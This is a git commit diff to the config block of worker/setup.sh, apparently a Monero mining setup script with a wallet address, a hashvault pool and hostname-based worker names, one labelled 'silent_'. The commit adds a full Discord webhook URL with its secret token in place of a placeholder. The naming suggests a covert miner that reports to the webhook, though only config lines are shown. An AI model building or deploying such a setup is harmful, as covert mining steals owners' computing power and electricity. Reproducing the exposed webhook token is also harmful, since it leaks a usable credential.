31cbb82d00b7d5131cd52eed5ac9322fea5cbeb7
DucManh206 <117666678+DucManh206@users.noreply.github.com>
2025-04-18 16:43:05 +0700

    Update setup.sh

--- worker/setup.sh
+++ worker/setup.sh
@@ -7,7 +7,7 @@
 # ========== CONFIG ==========
 WALLET2="476tLSg94aUD7heHruXj87Ps2aJcauEBj9jQEuBp4cBsgxTaKrhfgHiLnGxo9jocM5A1ejJGiJz2NjVi4VehM8Ky7fQmNY8"  # ⚠️ Thay ví của bạn vào đây
 POOL="pool.hashvault.pro:443"
-DISCORD_WEBHOOK="https://discord.com/api/webhooks/..."
+DISCORD_WEBHOOK="https://discord.com/api/webhooks/1362712368441852015/UzYhxkLkAvkZm1IA8oy769N-PLfPJakT9OWe9wr2SCmNWVL0842CABegDTEI4rT5K9os"
 KEY="47jKLNTu7MHZzbyfnhEZV4PHXe7z8CzpU6WV6hukLPthYnzmtXRWDFUYaa3pdM9xMnQxwsHCnw1zXBkVaNeUGRVkUc7VXoL"
 WORKER1="core_$(hostname)"
 WORKER2="silent_$(hostname)"
